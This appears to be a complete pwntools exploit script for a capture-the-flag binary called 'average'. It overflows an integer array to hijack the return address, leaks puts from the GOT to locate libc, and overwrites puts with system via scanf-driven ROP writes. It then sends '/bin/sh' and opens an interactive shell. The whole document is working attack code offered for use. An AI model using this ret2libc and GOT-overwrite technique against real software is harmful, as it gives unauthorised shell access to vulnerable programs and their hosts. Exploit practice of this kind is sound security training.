from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *0x0000000000401263
continue
'''.format(**locals())

exe = './challenge/average'
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc
p = start()

ret = 0x000000000040101a
pop_rdi_ret = 0x00000000004013a3
pop_rsi_r15_ret = 0x00000000004013a1
pos = 0x404000
fmt = 0x402008

def snd(num):
    p.sendlineafter(b': ', str(num).encode())

def overwrite_ret(after):
    # after: number of buffer need to overwrite after ret
    p.sendlineafter(b'n: ', b'17')
    for i in range(16): snd(1)     # overwrite buffer A (16 elements)
    
    snd(21 + after)                # reset n
    for i in range(2): snd(0)      # overwrite sum, average
    
    snd(19)                        # reset i
    snd(0)                         # overwrite rbp


# leak got puts 
overwrite_ret(4)
snd(pop_rdi_ret)
snd(elf.got.puts)
snd(elf.plt.puts)
snd(elf.entrypoint); p.recvline()

leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
info("Leak got puts: " + hex(leak))
libc.address = leak - libc.sym.puts 

# ret2libc ropchain
# overwrite got puts -> system
overwrite_ret(16)
snd(pop_rdi_ret)
snd(fmt)
snd(pop_rsi_r15_ret)
snd(elf.got.puts)
snd(0)
snd(elf.plt.__isoc99_scanf)

# overwrite pos (writeable) -> /bin/sh
snd(pop_rdi_ret)
snd(fmt)
snd(pop_rsi_r15_ret)
snd(pos)
snd(0)
snd(elf.plt.__isoc99_scanf)

# ret to puts
snd(pop_rdi_ret)
snd(pos)
snd(ret)
snd(elf.plt.puts)


p.sendline(str(libc.sym.system).encode())
p.sendline(str(int.from_bytes(b'/bin/sh\x00', 'little')).encode())

p.interactive()
